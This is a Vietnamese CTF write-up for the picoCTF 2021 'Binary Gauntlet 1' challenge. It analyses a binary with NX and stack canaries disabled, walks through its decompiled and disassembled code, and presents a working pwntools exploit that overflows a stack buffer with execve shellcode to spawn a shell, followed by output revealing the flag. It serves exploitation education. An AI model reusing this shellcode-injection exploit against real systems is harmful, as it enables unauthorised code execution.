# Binary Gauntlet 1
[Tham khảo binary gauntlet 0](../Binary-Gauntlet-0)
## Kiểm tra file
### file
```bash
gauntlet: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=2a7f79b758fdc250528e5bbc3da169fbf74e4ad3, not stripped
```
### checksec
```bash
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
RWX:      Has RWX segments
```
Cũng như gauntlet 0, không khác gì lắm
## Decompile & Disassemble
### Decompile main
```c
undefined8 main(void)
{
  char local_78 [104];
  char *local_10;
  
  local_10 = (char *)malloc(1000);
  printf("%p\n",local_78);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  printf(local_10);
  fflush(stdout);
  fgets(local_10,1000,stdin);
  local_10[999] = '\0';
  strcpy(local_78,local_10);
  return 0;
}
```
Lần này chương trình không có phương thức để đọc flag. Vì vậy chúng ta sẽ dùng shellcode để mở shell và đọc flag. Chương trình cung cấp cho ta địa chỉ của biến local_78, đây sẽ là nơi ta chèn shellcode vào và return về
```c
printf("%p\n",local_78);
```
### Disassemble main
```asm
0x0000000000400687 <+0>:	push   rbp
0x0000000000400688 <+1>:	mov    rbp,rsp
0x000000000040068b <+4>:	add    rsp,0xffffffffffffff80
0x000000000040068f <+8>:	mov    DWORD PTR [rbp-0x74],edi
0x0000000000400692 <+11>:	mov    QWORD PTR [rbp-0x80],rsi
0x0000000000400696 <+15>:	mov    edi,0x3e8
0x000000000040069b <+20>:	call   0x400580 <malloc@plt>
0x00000000004006a0 <+25>:	mov    QWORD PTR [rbp-0x8],rax
0x00000000004006a4 <+29>:	lea    rax,[rbp-0x70]
0x00000000004006a8 <+33>:	mov    rsi,rax
0x00000000004006ab <+36>:	lea    rdi,[rip+0x122]        # 0x4007d4
0x00000000004006b2 <+43>:	mov    eax,0x0
0x00000000004006b7 <+48>:	call   0x400560 <printf@plt>
0x00000000004006bc <+53>:	mov    rax,QWORD PTR [rip+0x20098d]        # 0x601050 <stdout@@GLIBC_2.2.5>
0x00000000004006c3 <+60>:	mov    rdi,rax
0x00000000004006c6 <+63>:	call   0x400590 <fflush@plt>
0x00000000004006cb <+68>:	mov    rdx,QWORD PTR [rip+0x20098e]        # 0x601060 <stdin@@GLIBC_2.2.5>
0x00000000004006d2 <+75>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006d6 <+79>:	mov    esi,0x3e8
0x00000000004006db <+84>:	mov    rdi,rax
0x00000000004006de <+87>:	call   0x400570 <fgets@plt>
0x00000000004006e3 <+92>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006e7 <+96>:	add    rax,0x3e7
0x00000000004006ed <+102>:	mov    BYTE PTR [rax],0x0
0x00000000004006f0 <+105>:	mov    rax,QWORD PTR [rbp-0x8]
0x00000000004006f4 <+109>:	mov    rdi,rax
0x00000000004006f7 <+112>:	mov    eax,0x0
0x00000000004006fc <+117>:	call   0x400560 <printf@plt>
0x0000000000400701 <+122>:	mov    rax,QWORD PTR [rip+0x200948]        # 0x601050 <stdout@@GLIBC_2.2.5>
0x0000000000400708 <+129>:	mov    rdi,rax
0x000000000040070b <+132>:	call   0x400590 <fflush@plt>
0x0000000000400710 <+137>:	mov    rdx,QWORD PTR [rip+0x200949]        # 0x601060 <stdin@@GLIBC_2.2.5>
0x0000000000400717 <+144>:	mov    rax,QWORD PTR [rbp-0x8]
0x000000000040071b <+148>:	mov    esi,0x3e8
0x0000000000400720 <+153>:	mov    rdi,rax
0x0000000000400723 <+156>:	call   0x400570 <fgets@plt>
0x0000000000400728 <+161>:	mov    rax,QWORD PTR [rbp-0x8]
0x000000000040072c <+165>:	add    rax,0x3e7
0x0000000000400732 <+171>:	mov    BYTE PTR [rax],0x0
0x0000000000400735 <+174>:	mov    rdx,QWORD PTR [rbp-0x8]
0x0000000000400739 <+178>:	lea    rax,[rbp-0x70]
0x000000000040073d <+182>:	mov    rsi,rdx
0x0000000000400740 <+185>:	mov    rdi,rax
0x0000000000400743 <+188>:	call   0x400550 <strcpy@plt>
0x0000000000400748 <+193>:	mov    eax,0x0
0x000000000040074d <+198>:	leave  
0x000000000040074e <+199>:	ret  
```
Biến local_78 nằm tại [rbp - 0x70]. Chúng ta cần 0x80 bytes để ghi đè return address. Payload của ta sẽ có dạng "shellcode + padding * (0x78 - độ dài shellcode) + địa chỉ biến local_78"
## Exploit
```python
from pwn import *

context.binary = ELF("./gauntlet")

run = remote("mercury.picoctf.net", 13644)
addr = run.recvline()
run.sendline("Pwned")

addr = int(addr, 16)

payload = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
payload += b'A' * (0x78 - len(payload))
payload += p64(addr)

run.sendline(payload)

run.interactive()
```
## Output
```bash
[*] '/home/revirven/Desktop/GitHub/CTF-Writeups/PicoCTF-2021/Binary-Exploitation/Binary-Gauntlet-1/gauntlet'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to mercury.picoctf.net on port 13644: Done
[*] Switching to interactive mode
Pwned
$ cat flag.txt
66fa43e73fc405235d4d2aa9da1b257f
```
